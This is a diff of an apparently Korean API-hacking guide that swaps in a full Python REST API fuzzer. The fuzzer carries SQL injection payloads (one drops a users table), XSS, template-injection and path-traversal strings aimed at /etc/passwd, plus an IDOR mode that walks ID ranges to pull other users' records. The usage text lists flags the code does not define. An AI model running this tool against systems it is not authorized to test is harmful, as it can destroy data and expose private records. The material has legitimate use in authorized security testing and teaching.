@@ -419,114 +419,323 @@ curl -X POST https://target.com/graphql \
 
 ```python
 #!/usr/bin/env python3
-"""REST API 자동 퍼저"""
+"""
+REST API 자동 퍼저 — OpenAPI 스펙 기반 + 수동 퍼징 지원
+사용: python3 api_fuzzer.py fuzz --url https://api.target.com \
+                                  --token eyJ... \
+                                  --endpoints /api/v1/users /api/v1/orders
+      python3 api_fuzzer.py openapi --spec swagger.json \
+                                     --url https://api.target.com \
+                                     --token eyJ...
+      python3 api_fuzzer.py idor   --url https://api.target.com/v1/orders \
+                                    --token-a TOKEN_A --token-b TOKEN_B \
+                                    --id-range 1 500
+"""
 
-import requests
+from __future__ import annotations
+import argparse
 import json
-import random
-import string
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field
+from pathlib import Path
 from typing import Any
+from urllib.parse import urljoin
+
+try:
+    import requests
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+except ImportError:
+    sys.exit("pip install requests")
+
+
+# ── 퍼징 페이로드 정의 ───────────────────────────────────────
+
+PAYLOADS: dict[str, list[str]] = {
+    "sqli": [
+        "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--",
+        "' UNION SELECT 1,2,3--", "1 AND SLEEP(5)--",
+    ],
+    "xss": [
+        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)", "';alert(1)//",
+    ],
+    "ssti": [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
+    ],
+    "path_traversal": [
+        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    ],
+    "special": [
+        "", " ", "null", "undefined", "true", "false",
+        "0", "-1", "9999999999", "A" * 8192, "\x00", "\n\r",
+        "admin", "'; --", "<>\"'{}|\\^`",
+    ],
+}
+
+SQL_ERROR_PATTERNS = [
+    "syntax error", "mysql_fetch", "ORA-", "sqlite",
+    "pg_query", "unclosed quotation", "sqlstate", "JDBC",
+    "java.sql.", "System.Data.SqlClient",
+]
+
+
+# ── 발견 결과 ────────────────────────────────────────────────
+
+@dataclass
+class Finding:
+    vuln_type: str
+    url: str
+    method: str
+    param: str
+    payload: str
+    status: int
+    evidence: str = ""
+    elapsed: float = 0.0
+
+    def __str__(self) -> str:
+        return (
+            f"[{self.vuln_type}] {self.method} {self.url}\n"
+            f"  param={self.param!r}  payload={self.payload[:60]!r}\n"
+            f"  status={self.status}  elapsed={self.elapsed:.2f}s"
+            + (f"\n  evidence={self.evidence[:120]!r}" if self.evidence else "")
+        )
+
+
+# ── HTTP 세션 헬퍼 ───────────────────────────────────────────
+
+def make_session(token: str | None = None,
+                 timeout: int = 10) -> requests.Session:
+    sess = requests.Session()
+    retry = Retry(total=2, backoff_factor=0.3,
+                  status_forcelist=[429, 502, 503, 504])
+    sess.mount("https://", HTTPAdapter(max_retries=retry))
+    sess.mount("http://",  HTTPAdapter(max_retries=retry))
+    if token:
+        sess.headers["Authorization"] = f"Bearer {token}"
+    sess.headers["User-Agent"] = "APIFuzzer/1.0"
+    return sess
+
+
+# ── 응답 분석 ────────────────────────────────────────────────
+
+def analyze(resp: requests.Response, url: str, method: str,
+            param: str, payload: str) -> list[Finding]:
+    findings: list[Finding] = []
+    body = resp.text
+    elapsed = resp.elapsed.total_seconds()
+
+    # SQL 에러
+    for pat in SQL_ERROR_PATTERNS:
+        if pat.lower() in body.lower():
+            findings.append(Finding(
+                "SQL Injection", url, method, param, payload,
+                resp.status_code, pat, elapsed,
+            ))
+            break
+
+    # Reflected XSS
+    if payload in body and any(
+        tag in payload.lower() for tag in ("<script", "<img", "onerror=")
+    ):
+        findings.append(Finding(
+            "Reflected XSS", url, method, param, payload,
+            resp.status_code, "", elapsed,
+        ))
+
+    # SSTI
+    if "{{7*7}}" in payload and "49" in body:
+        findings.append(Finding(
+            "SSTI", url, method, param, payload,
+            resp.status_code, "7*7=49 반영", elapsed,
+        ))
+
+    # Path Traversal
+    if "root:" in body or "[extensions]" in body:
+        findings.append(Finding(
+            "Path Traversal", url, method, param, payload,
+            resp.status_code, body[:100], elapsed,
+        ))
+
+    # 500 오류 노출
+    if resp.status_code == 500:
+        findings.append(Finding(
+            "Internal Error", url, method, param, payload,
+            500, body[:200], elapsed,
+        ))
+
+    # Time-based (5초 이상)
+    if elapsed > 5.0:
+        findings.append(Finding(
+            "Time-based Blind", url, method, param, payload,
+            resp.status_code, f"elapsed={elapsed:.1f}s", elapsed,
+        ))
+
+    return findings
+
+
+# ── 퍼저 코어 ────────────────────────────────────────────────
 
 class APIFuzzer:
-    def __init__(self, base_url: str, auth_header: dict = None):
-        self.base_url = base_url
-        self.session = requests.Session()
-        if auth_header:
-            self.session.headers.update(auth_header)
-        
-        self.findings = []
-    
-    def fuzz_string(self) -> list:
-        """문자열 퍼징 페이로드"""
-        return [
-            "",                           # 빈 값
-            " ",                          # 공백
-            "null",                       # null 문자열
-            "true",                       # 불리언 문자열
-            "0",                          # 숫자 문자열
-            "' OR '1'='1",               # SQLi
-            "'; DROP TABLE users--",      # SQLi
-            "<script>alert(1)</script>",  # XSS
-            "{{7*7}}",                    # SSTI
-            "${7*7}",                     # EL 인젝션
-            "../../../etc/passwd",        # Path traversal
-            "A" * 10000,                  # 버퍼 오버플로우
-            "\x00",                       # Null byte
-            "admin",                      # 특수 값
-            "\n\r",                       # CRLF
+    def __init__(self, base_url: str, token: str | None = None,
+                 threads: int = 5, timeout: int = 10,
+                 payload_types: list[str] | None = None) -> None:
+        self.base_url  = base_url.rstrip("/")
+        self.session   = make_session(token, timeout)
+        self.timeout   = timeout
+        self.threads   = threads
+        self.findings: list[Finding] = []
+        ptypes = payload_types or list(PAYLOADS)
+        self.payloads  = [p for t in ptypes for p in PAYLOADS.get(t, [])]
+
+    def _fuzz_single(self, url: str, method: str,
+                     param: str, payload: str) -> list[Finding]:
+        try:
+            if method == "GET":
+                r = self.session.get(url, params={param: payload},
+                                     timeout=self.timeout)
+            else:
+                r = self.session.request(method, url,
+                                         json={param: payload},
+                                         timeout=self.timeout)
+            return analyze(r, url, method, param, payload)
+        except requests.RequestException:
+            return []
+
+    def fuzz_endpoint(self, path: str, method: str = "GET",
+                      params: list[str] | None = None) -> None:
+        url = f"{self.base_url}{path}"
+        test_params = params or ["id", "user_id", "name", "search", "q",
+                                  "page", "sort", "filter", "file", "path"]
+        tasks: list[tuple] = [
+            (url, method, param, payload)
+            for param in test_params
+            for payload in self.payloads
         ]
-    
-    def fuzz_endpoint(self, endpoint: str, method: str = 'GET',
-                      params: dict = None):
-        """엔드포인트 퍼징"""
-        
-        if not params:
-            # 간단한 파라미터 발견
-            for fuzz_param in ['id', 'user_id', 'name', 'search', 'q']:
-                for payload in self.fuzz_string():
-                    url = f"{self.base_url}{endpoint}"
-                    
-                    try:
-                        if method == 'GET':
-                            resp = self.session.get(
-                                url, 
-                                params={fuzz_param: payload},
-                                timeout=10
-                            )
-                        else:
-                            resp = self.session.post(
-                                url,
-                                json={fuzz_param: payload},
-                                timeout=10
-                            )
-                        
-                        self._analyze_response(
-                            resp, endpoint, fuzz_param, payload
-                        )
-                    except Exception as e:
-                        pass
-    
-    def _analyze_response(self, resp: requests.Response, 
-                          endpoint: str, param: str, payload: str):
-        """응답 분석으로 취약점 탐지"""
-        
-        # SQL 오류
-        sql_errors = ['syntax error', 'mysql_fetch', 'ORA-', 
-                      'sqlite', 'sql server', 'pg_query']
-        for err in sql_errors:
-            if err.lower() in resp.text.lower():
-                self.findings.append({
-                    'type': 'SQL Injection',
-                    'endpoint': endpoint,
-                    'parameter': param,
-                    'payload': payload,
-                    'status': resp.status_code
-                })
-                print(f"[!] 잠재적 SQLi: {endpoint}?{param}={payload}")
-        
-        # XSS 반사
-        if payload in resp.text and '<script>' in payload.lower():
-            self.findings.append({
-                'type': 'Reflected XSS',
-                'endpoint': endpoint,
-                'parameter': param
-            })
-        
-        # 오류 노출
-        if resp.status_code == 500:
-            print(f"[!] 서버 오류: {endpoint} ({param}={payload[:20]})")
-        
-        # 응답 시간 기반 탐지 (Time-based)
-        if resp.elapsed.total_seconds() > 5:
-            print(f"[!] 느린 응답 ({resp.elapsed.total_seconds():.1f}s): {endpoint}")
-    
-    def generate_report(self):
-        print(f"\n=== API 퍼징 결과 ({len(self.findings)}개 발견) ===")
-        for finding in self.findings:
-            print(f"\n[{finding['type']}]")
-            print(f"  엔드포인트: {finding['endpoint']}")
-            print(f"  파라미터: {finding.get('parameter', '-')}")
-            print(f"  페이로드: {finding.get('payload', '-')[:50]}")
+        with ThreadPoolExecutor(max_workers=self.threads) as pool:
+            futs = {pool.submit(self._fuzz_single, *t): t for t in tasks}
+            for fut in as_completed(futs):
+                for f in fut.result():
+                    self.findings.append(f)
+                    print(f)
+
+    def fuzz_openapi(self, spec_path: Path) -> None:
+        """OpenAPI/Swagger 스펙 파싱 후 모든 엔드포인트 퍼징"""
+        spec = json.loads(spec_path.read_text())
+        paths = spec.get("paths", {})
+        print(f"[*] OpenAPI 엔드포인트 {len(paths)}개 발견")
+        for path, methods in paths.items():
+            for method_name, op in methods.items():
+                if method_name in ("get", "post", "put", "patch", "delete"):
+                    # 파라미터 이름 추출
+                    params = [
+                        p.get("name", "q")
+                        for p in op.get("parameters", [])
+                        if p.get("in") in ("query", "path")
+                    ]
+                    self.fuzz_endpoint(path, method_name.upper(), params or None)
+
+    def idor_scan(self, path_template: str, id_start: int, id_end: int,
+                  own_ids: set[int], token_victim: str) -> None:
+        """IDOR 스캔: 공격자 토큰으로 피해자 리소스 ID 접근 시도"""
+        victim_sess = make_session(token_victim, self.timeout)
+
+        def check(resource_id: int) -> Finding | None:
+            if resource_id in own_ids:
+                return None
+            url = f"{self.base_url}{path_template.format(id=resource_id)}"
+            try:
+                r = self.session.get(url, timeout=self.timeout)
+                if r.status_code == 200:
+                    return Finding(
+                        "IDOR/BOLA", url, "GET", "id",
+                        str(resource_id), 200,
+                        r.text[:100], r.elapsed.total_seconds(),
+                    )
+            except requests.RequestException:
+                pass
+            return None
+
+        with ThreadPoolExecutor(max_workers=self.threads) as pool:
+            for f in as_completed(
+                pool.submit(check, i) for i in range(id_start, id_end + 1)
+            ):
+                result = f.result()
+                if result:
+                    self.findings.append(result)
+                    print(result)
+
+    def report(self, output: Path | None = None) -> None:
+        summary: dict[str, int] = {}
+        for f in self.findings:
+            summary[f.vuln_type] = summary.get(f.vuln_type, 0) + 1
+        print(f"\n{'='*50}")
+        print(f"[요약] 총 {len(self.findings)}개 발견")
+        for vtype, cnt in sorted(summary.items(), key=lambda x: -x[1]):
+            print(f"  {vtype:25s}: {cnt}")
+
+        if output:
+            data = [
+                {"type": f.vuln_type, "url": f.url, "method": f.method,
+                 "param": f.param, "payload": f.payload,
+                 "status": f.status, "evidence": f.evidence}
+                for f in self.findings
+            ]
+            output.write_text(json.dumps(data, indent=2, ensure_ascii=False))
+            print(f"[*] 결과 저장: {output}")
+
+
+# ── CLI ──────────────────────────────────────────────────────
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="REST API 자동 퍼저")
+    parser.add_argument("--url",     required=True,  help="기본 URL")
+    parser.add_argument("--token",   default=None,   help="Bearer 토큰")
+    parser.add_argument("--threads", type=int, default=5)
+    parser.add_argument("--timeout", type=int, default=10)
+    parser.add_argument("--output",  type=Path)
+    parser.add_argument("--payloads", nargs="*",
+                        choices=list(PAYLOADS), default=None)
+
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    fuzz_p = sub.add_parser("fuzz", help="엔드포인트 퍼징")
+    fuzz_p.add_argument("--endpoints", nargs="+", required=True)
+    fuzz_p.add_argument("--method", default="GET")
+    fuzz_p.add_argument("--params", nargs="*")
+
+    oa_p = sub.add_parser("openapi", help="OpenAPI 스펙 기반 퍼징")
+    oa_p.add_argument("--spec", type=Path, required=True)
+
+    idor_p = sub.add_parser("idor", help="IDOR 스캔")
+    idor_p.add_argument("--path", required=True,
+                        help="리소스 경로 템플릿, 예: /v1/orders/{id}")
+    idor_p.add_argument("--id-range", nargs=2, type=int, metavar=("START", "END"),
+                        required=True)
+    idor_p.add_argument("--token-victim", required=True)
+    idor_p.add_argument("--own-ids", nargs="*", type=int, default=[])
+
+    args = parser.parse_args()
+    fuzzer = APIFuzzer(args.url, args.token, args.threads,
+                       args.timeout, args.payloads)
+
+    if args.cmd == "fuzz":
+        for ep in args.endpoints:
+            fuzzer.fuzz_endpoint(ep, args.method.upper(), args.params)
+    elif args.cmd == "openapi":
+        fuzzer.fuzz_openapi(args.spec)
+    elif args.cmd == "idor":
+        fuzzer.idor_scan(args.path, args.id_range[0], args.id_range[1],
+                         set(args.own_ids), args.token_victim)
+
+    fuzzer.report(args.output)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
